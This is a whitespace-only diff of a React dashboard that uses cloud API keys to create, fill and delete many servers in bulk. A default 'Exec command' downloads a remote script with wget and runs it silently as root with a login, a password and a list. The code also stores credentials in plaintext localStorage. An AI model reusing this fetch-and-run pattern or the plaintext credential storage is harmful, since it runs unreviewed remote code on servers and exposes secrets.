@@ -282,13 +282,13 @@ function App() {
       return;
     }
 
-    if(!login || !password) {
+    if (!login || !password) {
       alert('invalid credentials')
       return;
     }
 
     window.localStorage.setItem('keys', JSON.stringify(keys))
-    window.localStorage.setItem('creds', JSON.stringify({login, password}))
+    window.localStorage.setItem('creds', JSON.stringify({ login, password }))
 
     let perf = {}
 
@@ -401,27 +401,27 @@ function App() {
   return (
     <div className='container-fluid mt-3'>
       <>
-          <div className="row">
-            <div className="col-9">
-              <label className="form-label">Api key:</label>
-              <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"}>
-              </textarea>
-            </div>
-            <div className="col-3">
-              <label className="form-label">Login:</label>
-              <input type="text" ref={$login} className="form-control mb-1" defaultValue={creds.login} />
-              <label className="form-label">Password:</label>
-              <input type="text" ref={$password} className="form-control mb-1" defaultValue={creds.password} />
-            </div>
+        <div className="row">
+          <div className="col-9">
+            <label className="form-label">Api key:</label>
+            <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"}>
+            </textarea>
           </div>
-          <div className="row">
-            <div className="col">
-              <label className="form-label">Exec command:</label>
-              <input type="text" ref={$exec} className="form-control mb-1" defaultValue={`#!/bin/bash\\ncd /root\\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &`} />
-            </div>
+          <div className="col-3">
+            <label className="form-label">Login:</label>
+            <input type="text" ref={$login} className="form-control mb-1" defaultValue={creds.login} />
+            <label className="form-label">Password:</label>
+            <input type="text" ref={$password} className="form-control mb-1" defaultValue={creds.password} />
           </div>
-          <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
-<hr className='my-4'/>
+        </div>
+        <div className="row">
+          <div className="col">
+            <label className="form-label">Exec command:</label>
+            <input type="text" ref={$exec} className="form-control mb-1" defaultValue={`#!/bin/bash\\ncd /root\\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &`} />
+          </div>
+        </div>
+        <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
+        <hr className='my-4' />
         {apiKeys.length > 0 && <>
           {apiKeys.map(apiKey => (
             <div className="card mb-2" key={apiKey}>
@@ -430,39 +430,39 @@ function App() {
               </Style.ProgressContainer>}
               <div className="card-body">
                 <h5 className="card-title">{apiKey}</h5>
-                  <div className="btn-group mb-3">
-                    <button className="btn btn-sm btn-primary" onClick={getPerf(apiKey)}>Get Performance</button>
-                    <button className="btn btn-sm btn-primary" onClick={() => getData(apiKey)}>Refresh</button>
-                    <button className="btn btn-sm btn-primary" onClick={createDroplet(apiKey)}>Create</button>
-                    <button className="btn btn-sm btn-primary" onClick={createDroplets(apiKey)}>Create droplets</button>
-                    <button className="btn btn-sm btn-primary" onClick={fillDroplets(apiKey)}>Fill remaining</button>
-                    <button className="btn btn-sm btn-danger" onClick={deleteAllDroplet(apiKey)}>Delete All</button>
-                  </div>
-                  {state[apiKey] && state[apiKey].map((droplet, index) => {
+                <div className="btn-group mb-3">
+                  <button className="btn btn-sm btn-primary" onClick={getPerf(apiKey)}>Get Performance</button>
+                  <button className="btn btn-sm btn-primary" onClick={() => getData(apiKey)}>Refresh</button>
+                  <button className="btn btn-sm btn-primary" onClick={createDroplet(apiKey)}>Create</button>
+                  <button className="btn btn-sm btn-primary" onClick={createDroplets(apiKey)}>Create droplets</button>
+                  <button className="btn btn-sm btn-primary" onClick={fillDroplets(apiKey)}>Fill remaining</button>
+                  <button className="btn btn-sm btn-danger" onClick={deleteAllDroplet(apiKey)}>Delete All</button>
+                </div>
+                {state[apiKey] && state[apiKey].map((droplet, index) => {
 
-                    return (
-                      <div className="row mb-1" key={droplet.id}>
-                        <div className="col-4">
-                          <Style.Ident>
-                            <Style.Name>{droplet.name}</Style.Name>
-                            <Style.ID>#{droplet.id}</Style.ID>
-                          </Style.Ident>
-                        </div>
-                        <div className="col-4">
-                          <div className="btn-group">
-                            <button className="btn btn-sm btn-primary" onClick={updatePerf(droplet.id, index, apiKey)}>update perf</button>
-                            <button className="btn btn-sm btn-primary" onClick={hardRestart(droplet.id, droplet.name, apiKey)}>hard restart</button>
-                            <button className="btn btn-sm btn-primary" onClick={deleteDroplet(droplet.id, apiKey)}>delete</button>
-                          </div>
-                        </div>
-                        <div className="col-4">
-                          <Style.ChartContainer>
-                            {renderChart(state?.perf?.[apiKey]?.[index]?.data?.result[0]?.values)}
-                          </Style.ChartContainer>
+                  return (
+                    <div className="row mb-1" key={droplet.id}>
+                      <div className="col-4">
+                        <Style.Ident>
+                          <Style.Name>{droplet.name}</Style.Name>
+                          <Style.ID>#{droplet.id}</Style.ID>
+                        </Style.Ident>
+                      </div>
+                      <div className="col-4">
+                        <div className="btn-group">
+                          <button className="btn btn-sm btn-primary" onClick={updatePerf(droplet.id, index, apiKey)}>update perf</button>
+                          <button className="btn btn-sm btn-primary" onClick={hardRestart(droplet.id, droplet.name, apiKey)}>hard restart</button>
+                          <button className="btn btn-sm btn-primary" onClick={deleteDroplet(droplet.id, apiKey)}>delete</button>
                         </div>
                       </div>
-                    )
-                  })}
+                      <div className="col-4">
+                        <Style.ChartContainer>
+                          {renderChart(state?.perf?.[apiKey]?.[index]?.data?.result[0]?.values)}
+                        </Style.ChartContainer>
+                      </div>
+                    </div>
+                  )
+                })}
               </div>
             </div>
           ))}
